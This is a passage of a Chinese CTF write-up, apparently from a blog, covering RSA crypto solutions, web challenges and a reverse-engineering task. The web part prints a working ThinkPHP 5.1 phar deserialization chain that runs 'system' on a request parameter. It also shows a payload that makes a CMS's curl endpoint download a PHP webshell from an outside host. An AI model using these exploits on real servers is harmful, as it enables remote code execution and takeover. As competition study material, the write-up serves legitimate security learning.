style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>，于是M3=M2+2=<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mn>2</mn></msub><mo>(</mo><msub><mi>p</mi><mn>3</mn></msub><mo>+</mo><mn>1</mn><mo>)</mo><mo>(</mo><msub><mi>p</mi><mn>1</mn></msub><mo>+</mo><msub><mi>p</mi><mn>2</mn></msub><mo>)</mo></mrow><annotation encoding="application/x-tex">p_2(p_3+1)(p_1+p_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，对M1和M3求gcd可得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mn>2</mn></msub><mo>∗</mo><mo>(</mo><msub><mi>p</mi><mn>1</mn></msub><mo>+</mo><msub><mi>p</mi><mn>2</mn></msub><mo>)</mo><mo>∗</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo>(</mo><msub><mi>p</mi><mn>1</mn></msub><mo>+</mo><mn>1</mn><mo separator="true">,</mo><msub><mi>p</mi><mn>3</mn></msub><mo>+</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">p_2*(p_1+p_2)*gcd(p_1+1,p_3+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，我们在1000的范围内爆破<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo>(</mo><msub><mi>p</mi><mn>1</mn></msub><mo>+</mo><mn>1</mn><mo separator="true">,</mo><msub><mi>p</mi><mn>3</mn></msub><mo>+</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">gcd(p_1+1,p_3+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，即可求得p1,p2,p3，后面由于p,q很近，枚举p-q分解n，正常解密即可。</p>
+<p>exp</p>
+<pre><code class="language-python">import sympy
+from gmpy2 import *
+from Crypto.Util.number import *
+def solve(a,b,c):
+    delta=b*b-4*a*c
+    if delta&lt;0:
+        return (0,0)
+    delta=isqrt(delta)
+    if (-b+delta)%(2*a)!=0 or (-b-delta)%(2*a)!=0:
+        return (0,0)
+    return ((-b+delta)//(2*a),(-b-delta)//(2*a))
+
+M1=3826382835023788442651551584905620963555468828948525089808250303867245240492543151274589993810948153358311949129889992078565218014437985797623260774173862776314394305207460929010448541919151371739763413408901958357439883687812941802749556269540959238015960789123081724913563415951118911225765239358145144847672813272304000303248185912184454183649550881987218183213383170287341491817813853157303415010621029153827654424674781799037821018845093480149146846916972070471616774326658992874624717335369963316741346596692937873980736392272357429717437248731018333011776098084532729315221881922688633390593220647682367272566275381196597702434911557385351389179790132595840157110385379375472525985874178185477024824406364732573663044243615168471526446290952781887679180315888377262181547383953231277148364854782145192348432075591465309521454441382119502677245090726728912738123512316475762664749771002090738886940569852252159994522316
+
+M2=4046011043117694641224946060698160981194371746049558443191995592417947642909277226440465640195903524402898673255622570650810338780358645872293473212692240675287998097280715739093285167811740252792986119669348108850168574423371861266994630851360381835920384979279568937740516573412510564312439718402689547377548575653450519989914218115265842158616123026997554651983837361028152010675551489190669776458201696937427188572741833635865019931327548900804323792893273443467251902886636756173665823644958563664967475910962085867559357008073496875191391847757991101189003154422578662820049387899402383235828011830444034463049749668906583814229827321704450021715601349950406035896249429068630164092309047645766216852109121662629835574752784717997655595307873219503797996696389945782836994848995124776375146245061787647756704605043856735398002012276311781956668212776588970619658063515356931386886871554860891089498456646036630114620806
+
+#t=gcd(M1,M2+2),m1=M1//t，m2=(M2+2)//t
+
+t=195589523630445818529902860956832796890855251392633128505267360019379766078441039447714629517705654989596005641784168486211312686680455807626431626165080866039191378864985968731741426496463223663496416166582452161079104234385985738660388414139911168334469051423205629829765572078313431736483728155228814915764228990643229252394940446647628166159386129345355060753013764486772721947063419319730756920046220488674399534007795610790140941688361870003545561101950379051252306239620980393842817770270164660348572241648029661122045865707023959462688020516797465334280134572790507613563583907925334439091301297527252508403124
+m1=19563332248068151535630981329078704836011877594400641639369459141215900260861025312054906757599794566083208720855569882795966368648050841796097774666530924861861072322505359934227960441733030841677273935286749895660385076617500078541482883261409708629757597729348593181573750624736984373186183627343721574559
+m2=20686235990647329610791853921718735187994958766092474204131359561885208246097905843101029093347765900355157072072179547621235081101156100572779845352580259426625670629461859798011004868747162865241652060762059495558269934939075323522904748472063800026320062177474213759817229716245635847559587261121068310442
+for i in range(2,1000,2):
+    t1=i*m1-1
+    t2=i*m2-1
+    if sympy.isprime(t1):
+        break
+
+#gcd=6,t1=117379993488408909213785887974472229016071265566403849836216754847295401565166151872329440545598767396499252325133419296775798211888305050776586647999185549171166433935032159605367762650398185050063643611720499373962310459705000471248897299568458251778545586376091559089442503748421906239117101764062329447353,t2=124117415943883977664751123530312411127969752596554845224788157371311249476587435058606174560086595402130942432433077285727410486606936603436679072115481556559754023776771158788066029212482977191449912364572356973349619609634451941137428490832382800157920373064845282558903378297473815085357523566726409862651
+c=1394946766416873131554934453357121730676319808212515786127918041980606746238793432614766163520054818740952818682474896886923871330780883504028665380422608364542618561981233050210507202948882989763960702612116316321009210541932155301216511791505114282546592978453573529725958321827768703566503841883490535620591951871638499011781864202874525798224508022092610499899166738864346749753379399602574550324310119667774229645827773608873832795828636770263111832990012205276425559363977526114225540962861740929659841165039419904164961095126757294762709194552018890937638480126740196955840656602020193044969685334441405413154601311657668298101837066325231888411018908300828382192203062405287670490877283269761047853117971492197659115995537837080400730294215778540754482680476723953659085854297184575548489544772248049479632420289954409052781880871933713121875562554234841599323223793407272634167421053493995795570508435905280269774274084603687516219837730100396191746101622725880529896250904142333391598426588238082485305372659584052445556638990497626342509620305749829144158797491411816819447836265318302080212452925144191536031249404138978886262136129250971366841779218675482632242265233134997115987510292911606736878578493796260507458773824689843424248233282828057027197528977864826149756573867022173521177021297886987799897923182290515542397534652789013340264587028424629766689059507844211910072808286250914059983957934670979551428204569782238857331272372035625901349763799005621577332502957693517473861726359829588419409120076625939502382579605
+n=19445950132976386911852381666731799463510958712950274248183192405937223343228119407660772413067599252710235310402278345391806863116119010697766434743302798644091220730819441599784039955347398797545219314925103529062092963912855489464914723588833817280786158985269401131919618320866942737291915603551320163001129725430205164159721810319128999027215168063922977994735609079166656264150778896809813972275824980250733628895449444386265971986881443278517689428198251426557591256226431727934365277683559038777220498839443423272238231659356498088824520980466482528835994554892785108805290209163646408594682458644235664198690503128767557430026565606308422630014285982847395405342842694189025641950775231191537369161140012412147734635114986068452144499789367187760595537610501700993916441274609074477086105160306134590864545056872161818418667370690945602050639825453927168529154141097668382830717867158189131567590506561475774252148991615602388725559184925467487450078068863876285937273896246520621965096127440332607637290032226601266371916124456122172418136550577512664185685633131801385265781677598863031205194151992390159339130895897510277714768645984660240750580001372772665297920679701044966607241859495087319998825474727920273063120701389749480852403561022063673222963354420556267045325208933815212625081478538158049144348626000996650436898760300563194390820694376019146835381357141426987786643471325943646758131021529659151319632425988111406974492951170237774415667909612730440407365124264956213064305556185423432341935847320496716090528514947
+e=65537
+p1=t1
+p3=t2
+term=t//6
+p2,P2=solve(1,p1,-term)
+pq=n//(p1*p2*p3)
+k=2
+while 1:
+    cha=k
+    he=(pq+cha*cha//4)*4
+    if iroot(he,2)[1]==True:
+        he=iroot(he,2)[0]
+        break
+    k+=2
+p,q=solve(1,-he,pq)
+phi=(p-1)*(q-1)*(p1-1)*(p2-1)*(p3-1)
+d=invert(e,phi)
+m=long_to_bytes(pow(c,d,n))
+print(m[256:256+42])
+</code></pre>
+<p>flag:为</p>
+<pre><code>D0g3{296b680c-7aeb-5272-8b33-7335b411fbcb}
+</code></pre>
+<h3 id="strange">strange</h3>
+<p>注意到m是flag，相对于hint和n来说都比较小，m|hint的操作对于hint来说影响很小，这就存在一个小值根，因此采用coppersmith的方法先解出m1，然后根据m1和m2先预估出m的位数，再爆破m的每一位来得到flag。</p>
+<p>exp：</p>
+<pre><code class="language-python">##sagemath
+n=13002904520196087913175026378157676218772224961198751789793139372975952998874109513709715017379230449514880674554473551508221946249854541352973100832075633211148140972925579736088058214014993082226530875284219933922497736077346225464349174819075866774069797318066487496627589111652333814065053663974480486379799102403118744672956634588445292675676671957278976483815342400168310432107890845293789670795394151784569722676109573685451673961309951157399183944789163591809561790491021872748674809148737825709985578568373545210653290368264452963080533949168735319775945818152681754882108865201849467932032981615400210529003
+c=8560367979088389639093355670052955344968008917787780010833158290316540154791612927595480968370338549837249823871244436946889198677945456273317343886485741297260557172704718731809632734567349815338988169177983222118718585249696953103962537942023413748690596354436063345873831550109098151014332237310265412976776977183110431262893144552042116871747127301026195142320678244525719655551498368460837394436842924713450715998795899172774573341189660227254331656916960984157772527015479797004423165812493802730996272276613362505737536007284308929288293814697988968407777480072409184261544708820877153825470988634588666018802
+h=9989639419782222444529129951526723618831672627603783728728767345257941311870269471651907118545783408295856954214259681421943807855554571179619485975143945972545328763519931371552573980829950864711586524281634114102102055299443001677757487698347910133933036008103313525651192020921231290560979831996376634906893793239834172305304964022881699764957699708192080739949462316844091240219351646138447816969994625883377800662643645172691649337353080140418336425506119542396319376821324619330083174008060351210307698279022584862990749963452589922185709026197210591472680780996507882639014068600165049839680108974873361895144
+Zmod=Zmod(n)
+P.&lt;x&gt;=PolynomialRing(Zmod)
+f=(h+x)^3-c
+x0=f.small_roots(X=2^400,beta=0.5)
+print(x0)
+m1=x0+h
+print(m1)
+##python
+from Crypto.Util.number import *
+h=9989639419782222444529129951526723618831672627603783728728767345257941311870269471651907118545783408295856954214259681421943807855554571179619485975143945972545328763519931371552573980829950864711586524281634114102102055299443001677757487698347910133933036008103313525651192020921231290560979831996376634906893793239834172305304964022881699764957699708192080739949462316844091240219351646138447816969994625883377800662643645172691649337353080140418336425506119542396319376821324619330083174008060351210307698279022584862990749963452589922185709026197210591472680780996507882639014068600165049839680108974873361895144
+m1=9989639419782222444529129951526723618831672627603783728728767345257941311870269471651907118545783408295856954214259681421943807855554571179619485975143945972545328763519931371552573980829950864711586524281634114102102055299443001677757487698347910133933036008103313525651192020921231290560979831996376634906893793239834172305304964022881699764957699708192080739949462316844091240219351646138447816969994625883377800662643645172691649337353080140418336425506119542396319376821324619330083174008060351210933049560781360717427446713646109570038056138652803756149233612618692820860571507613112565167824369560313209417725
+m2=9869907877594701353175281930839281485694004896356038595955883788511764488228640164047958227861871572990960024485992
+m=''
+m1=bin(m1)[2:]
+m1=m1[::-1]
+h=bin(h)[2:]
+h=h[::-1]
+m2=bin(m2)[2:]
+m2=m2[::-1]
+m2+='00000'
+bit=[0,1]
+for i in range(383):
+    for j in bit:
+        if j|int(h[i])==int(m1[i]) and j&amp;int(h[i])==int(m2[i]):
+            m+=str(j)
+print(m[::-1])
+print(int(m[::-1],2))
+print(long_to_bytes(int(m[::-1],2)))
+</code></pre>
+<p>flag为：</p>
+<pre><code>D0g3{R54_f4l1_1n_l0ve_with_CopperSmith_w0wow0!!}
+</code></pre>
+<h2 id="web">Web</h2>
+<h3 id="ez_tp">ez_tp</h3>
+<p>扫到www.zip，下载到源码。版本5.1.37，diff了一下发现没有什么不同，直接看源码</p>
+<figure data-type="image" tabindex="26"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/534026b47342f.png" alt="1638030400750.png" loading="lazy"></figure>
+<p>能读任意文件，但找不到flag位置，不过很明显看出phar反序列化</p>
+<p>找链子生成phar文件</p>
+<pre><code class="language-php">&lt;?php
+namespace think\process\pipes{
+
+    use think\model\Pivot;
+
+    class Windows
+    {
+        private $files = [];
+        public function __construct(){
+            $this-&gt;files[]=new Pivot();
+        }
+    }
+}
+namespace think{
+    abstract class Model
+    {
+        protected $append = [];
+        private $data = [];
+        public function __construct(){
+            $this-&gt;data=array(
+                'feng'=&gt;new Request()
+            );
+            $this-&gt;append=array(
+                'feng'=&gt;array(
+                    'hello'=&gt;'world'
+                )
+            );
+        }
+    }
+}
+namespace think\model{
+
+    use think\Model;
+
+    class Pivot extends Model
+    {
+
+    }
+}
+namespace think{
+    class Request
+    {
+        protected $hook = [];
+        protected $filter;
+        protected $config = [
+            // 表单请求类型伪装变量
+            'var_method'       =&gt; '_method',
+            // 表单ajax伪装变量
+            'var_ajax'         =&gt; '',
+            // 表单pjax伪装变量
+            'var_pjax'         =&gt; '_pjax',
+            // PATHINFO变量名 用于兼容模式
+            'var_pathinfo'     =&gt; 's',
+            // 兼容PATH_INFO获取
+            'pathinfo_fetch'   =&gt; ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
+            // 默认全局过滤方法 用逗号分隔多个
+            'default_filter'   =&gt; '',
+            // 域名根，如thinkphp.cn
+            'url_domain_root'  =&gt; '',
+            // HTTPS代理标识
+            'https_agent_name' =&gt; '',
+            // IP代理获取标识
+            'http_agent_ip'    =&gt; 'HTTP_X_REAL_IP',
+            // URL伪静态后缀
+            'url_html_suffix'  =&gt; 'html',
+        ];
+        public function __construct(){
+            $this-&gt;hook['visible']=[$this,'isAjax'];
+            $this-&gt;filter=&quot;system&quot;;
+        }
+    }
+}
+namespace{
+    use think\process\pipes\Windows;
+    $phar = new Phar(&quot;phar3.phar&quot;); //后缀名必须为phar,压缩后的文件名
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot; __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+    $o = new Windows();
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;hello.txt&quot;, &quot;test&quot;); //test为内容test.txt为要压缩的文件(可以不存在)
+//签名自动计算
+    $phar-&gt;stopBuffering();
+//    echo base64_encode(serialize(new Windows));
+}
+
+</code></pre>
+<p>读phar</p>
+<pre><code class="language-php">&lt;?php
+    echo base64_encode(file_get_contents(&quot;phar3.phar&quot;));
+</code></pre>
+<p>payload变量覆盖一下</p>
+<p>http://1.12.220.15:19274/index.php/index/index/hello?shell=cat /*</p>
+<pre><code class="language-php">world=hello=IF9fSEFMVF9DT01QSUxFUigpOyA/Pg0KJgMAAAEAAAARAAAAAQAAAAAA7wIAAE86Mjc6InRoaW5rXHByb2Nlc3NccGlwZXNcV2luZG93cyI6MTp7czozNDoiAHRoaW5rXHByb2Nlc3NccGlwZXNcV2luZG93cwBmaWxlcyI7YToxOntpOjA7TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjI6e3M6OToiACoAYXBwZW5kIjthOjE6e3M6NDoiZmVuZyI7YToxOntzOjU6ImhlbGxvIjtzOjU6IndvcmxkIjt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6NDoiZmVuZyI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo4O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjEwOntzOjEwOiJ2YXJfbWV0aG9kIjtzOjc6Il9tZXRob2QiO3M6ODoidmFyX2FqYXgiO3M6MDoiIjtzOjg6InZhcl9wamF4IjtzOjU6Il9wamF4IjtzOjEyOiJ2YXJfcGF0aGluZm8iO3M6MToicyI7czoxNDoicGF0aGluZm9fZmV0Y2giO2E6Mzp7aTowO3M6MTQ6Ik9SSUdfUEFUSF9JTkZPIjtpOjE7czoxODoiUkVESVJFQ1RfUEFUSF9JTkZPIjtpOjI7czoxMjoiUkVESVJFQ1RfVVJMIjt9czoxNDoiZGVmYXVsdF9maWx0ZXIiO3M6MDoiIjtzOjE1OiJ1cmxfZG9tYWluX3Jvb3QiO3M6MDoiIjtzOjE2OiJodHRwc19hZ2VudF9uYW1lIjtzOjA6IiI7czoxMzoiaHR0cF9hZ2VudF9pcCI7czoxNDoiSFRUUF9YX1JFQUxfSVAiO3M6MTU6InVybF9odG1sX3N1ZmZpeCI7czo0OiJodG1sIjt9fX19fX0JAAAAaGVsbG8udHh0BAAAAAJnomEEAAAADH5/2LYBAAAAAAAAdGVzdM/lB06QxBmPdCdWlMiCHMEIvsfXAgAAAEdCTUI=%26a=phar://hello.txt
+</code></pre>
+<figure data-type="image" tabindex="27"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/859b86d9bd5d6.png" alt="1638033323892.png" loading="lazy"></figure>
+<h3 id="ezcms">ezcms</h3>
+<p>审到很多前台sql注入，只能时间盲注，总是注到一半环境就崩，崩了之后重开又打不通了。</p>
+<p>之后本地测试之后是可以未授权的，所以直接找后台功能，看到一个curl接口。</p>
+<figure data-type="image" tabindex="28"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/a7e8cf838b294.png" alt="1638033469959.png" loading="lazy"></figure>
+<p>应该是可以远程下载文件的。</p>
+<p>前面有</p>
+<pre><code class="language-php">if (isset($_GET['url'])){
+	$dname=explode(&quot;/&quot;, $_GET['url']);
+//	print_r($dname);
+ 	if(strpos($dname[2],'sem-cms.cn') !== false){ 
+	   $url=$_GET['url'];
+	}else{
+		echo(&quot;&lt;script language='javascript'&gt;alert('非法操作');window.history.back(-1);&lt;/script&gt;&quot;);
+	    exit;
+	}
+</code></pre>
+<p>用/分隔，dname[2]得包含sem-cms.cn，设置php文件名为此即可。</p>
+<p>payload</p>
+<pre><code class="language-php">http://81.69.27.32:8888/CxWsbN_AR4/Ant_Curl.php?url=47.101.176.40/shell/sem-cms.cn.php
+</code></pre>
+<p>提示下载失败，但本地测试之后其实是成功的，蚁剑连接</p>
+<p>Soft/Zip/sem-cms.cn.php</p>
+<figure data-type="image" tabindex="29"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/c69bd7438f2ba.png" alt="1638034228982.png" loading="lazy"></figure>
+<h2 id="re">RE</h2>
+<h3 id="virtus">virtus</h3>
+<p>是傀儡进程，先dump出来真正的程序</p>
+<figure data-type="image" tabindex="30"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/313881c468224.png" alt="1638068970432.png" loading="lazy"></figure>
+<p>题目要求输入两个内容，一个是key,一个是flag,key的长度是4，flag长度是32</p>
+<figure data-type="image" tabindex="31"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/bdca24d8a1490.png" alt="1638068996240.png" loading="lazy"></figure>
+<p>使用线程对flag进行加密,算法很简单，就是异或</p>
+<figure data-type="image" tabindex="32"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/84a7f617483e2.png" alt="1638069036218.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="33"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/9184417018aa6.png" alt="1638069044141.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="34"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/87a32b41b6913.png" alt="1638069057093.png" loading="lazy"></figure>
+<p>这里是对key进行运算，再用运算后的结果进行比较</p>
+<figure data-type="image" tabindex="35"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/5b539fe38c07b.png" alt="1638069104168.png" loading="lazy"></figure>
+<p>Key的加密算法我没看懂,但是Key长度并不长，直接写个脚本爆破，爆破出来key是:_shy</p>
+<figure data-type="image" tabindex="36"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/28/57b696c8f4d50.png" alt="1638069129230.png" loading="lazy"></figure>
